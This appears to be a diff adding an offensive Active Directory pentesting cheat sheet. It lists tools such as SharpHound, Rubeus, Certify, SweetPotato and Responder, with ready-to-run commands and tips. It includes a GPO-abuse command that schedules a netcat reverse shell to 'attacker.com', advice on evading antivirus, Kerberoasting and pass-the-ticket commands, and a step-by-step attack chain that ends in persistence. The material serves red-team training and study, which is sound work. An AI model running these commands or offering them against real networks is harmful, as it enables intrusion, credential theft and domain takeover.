@@ -1,0 +1,156 @@
+Tool	Purpose	When You Use It
+Sharphound	Collect AD data for BloodHound	Initial enumeration – users, groups, sessions
+SharpUp	Find privilege escalation paths	Local privesc on workstations/servers
+SharpShares	Find interesting SMB shares	Post-access recon, data hunting
+SharpGPOAbuse	Hijack GPOs for code execution	Privilege escalation or lateral movement
+Rubeus	Kerberos abuse (roasting, ticket manipulation)	Kerberoasting, golden tickets, pass-the-ticket
+Seatbelt	Local system recon (modular)	Info gathering for privesc and lateral movement
+WinPEAS	Privilege escalation checklist	Local privilege enumeration
+Certify	Abuse AD Certificate Services (ESC1-ESC8)	Cert template abuse and domain escalation
+SweetPotato	Privilege escalation via DLL hijack	Gain SYSTEM from service misconfigs
+Responder	Capture and relay hashes	Network poisoning / hash capture
+BloodHound (new UI)	Visual attack path mapping	Pivoting, privesc mapping, DA route planning
+
+
+
+Sharphound (BloodHound data collector)
+📌 Purpose: Enumerate AD structure, sessions, admin rights, trust paths
+📌 Use: Early-stage recon after gaining user access
+
+Powershell
+SharpHound.exe -c all
+Options:
+	• -c all: Collect everything
+	• -c session,localadmin,trusts: Limit scope
+	• Output: zip file for BloodHound upload
+	
+🧠 Tip: If restricted, try -c session or -c acl only to evade AV
+
+
+BloodHound (UI)
+📌 Purpose: Visualise AD relationships and attack paths
+📌 Use: Analyse the output of Sharphound
+Install with Neo4j (DB) and use the new Electron-based app:
+	• Upload collection.zip
+	• Use prebuilt queries:
+		○ “Find Shortest Path to Domain Admins”
+		○ “Users with Local Admin Access”
+🧠 Tip: New BloodHound has in-app pathfinder and attack graphing features. Prioritise these.
+
+
+SharpUp
+📌 Purpose: Automated privesc checker for Windows misconfigs
+📌 Use: On workstations where you want to go from user ➝ admin
+
+powershell
+SharpUp.exe
+Looks for:
+	• Unquoted service paths
+	• AlwaysInstallElevated
+	• Weak ACLs
+	• Token privileges
+🧠 Tip: Use winPEAS as fallback if SharpUp is flagged by AV
+
+
+SharpShares
+📌 Purpose: Scan the domain for interesting network shares
+📌 Use: Find shared folders you can access or write to
+
+Powershell
+SharpShares.exe
+Returns:
+	• Share name
+	• Path
+	• Permissions (Read/Write)
+🧠 Tip: Look for \\fileserver\IT\scripts or \\DC\NETLOGON — potential script execution locations
+
+
+SharpGPOAbuse
+📌 Purpose: Take over GPOs to gain code execution
+📌 Use: After BloodHound shows you control a GPO-linked OU
+
+powershell
+SharpGPOAbuse.exe --AddComputerTask --GPOName "Vuln GPO" --TaskName "ReverseShell" --Command "cmd.exe /c nc.exe attacker.com 4444 -e cmd.exe"
+
+🧠 Tip: Combine with BloodHound's "GPOs You Can Modify" query
+
+
+Rubeus
+📌 Purpose: All-in-one Kerberos toolkit
+📌 Use: Kerberoasting, AS-REP roasting, ticket abuse
+
+powershell
+# Kerberoasting
+Rubeus.exe kerberoast
+# AS-REP roasting (users without pre-auth)
+Rubeus.exe asreproast
+# Pass-the-ticket
+Rubeus.exe ptt /ticket:<base64ticket>
+# Ticket request
+Rubeus.exe tgtdeleg /user:<target> /rc4:<NTLM>
+🧠 Tip: Use /nowrap for hashcat-ready output
+
+
+Seatbelt
+📌 Purpose: Lightweight recon, modular
+📌 Use: Post-exploitation enum, find creds, tokens, configs
+
+powershell
+Seatbelt.exe -group=all
+Useful Modules:
+	• -group=logon: Logged-in users
+	• -group=services: Service permissions
+	• -group=cred: Saved passwords and tokens
+
+
+WinPEAS
+📌 Purpose: Full local privesc scanner
+📌 Use: Run it after compromising a workstation
+
+powershell
+.\winPEASx64.exe
+Flags vulnerable services, ACLs, paths, AlwaysInstallElevated, scheduled tasks, unquoted paths, etc.
+🧠 Tip: Use this when SharpUp is flagged
+
+
+Certify
+📌 Purpose: Exploit Active Directory Certificate Services
+📌 Use: Escalate domain privileges through vulnerable cert templates
+
+powershell
+# Find vulnerable templates
+Certify.exe find /vulnerable
+# Request cert
+Certify.exe request /ca:<CA Name> /template:<VulnTemplate> /subject:CN=TargetUser
+# Use resulting `.pfx` with Rubeus
+🧠 Tip: Target ESC1/ESC2/ESC8 if ADCS is present
+
+
+SweetPotato
+📌 Purpose: Privesc via privilege escalation exploits (like JuicyPotato)
+📌 Use: Gain SYSTEM on vulnerable Windows machines
+
+powershell
+SweetPotato.exe -p "C:\Path\to\reverse_shell.exe"
+Exploits:
+	• SeImpersonatePrivilege
+	• SeAssignPrimaryTokenPrivilege
+🧠 Tip: Works when PrintSpoofer is patched or broken
+
+
+Responder
+📌 Purpose: Poison LLMNR/NBT-NS/MDNS to steal hashes
+📌 Use: On internal LAN segments to capture NTLM hashes
+
+bash
+sudo responder -I eth0
+🧠 Tip: Pair with NTLMRelayX to relay stolen hashes to a live SMB target
+
+
+Example Scenario: What Tools You Might Use in a Test
+	1. Initial Access via VPN – 	use Seatbelt + winPEAS for local privesc
+	PrivEsc to Local Admin – 	use SharpUp or drop SweetPotato
+	Dump Creds & Tokens – 	use Rubeus and SharpHound
+	Lateral Movement – 	use CrackMapExec, SharpShares, or GPO abuse
+	Escalate to DA – 	use Certify or BloodHound attack path
+	Post-Exploitation – 	deploy persistent GPO or scheduled task
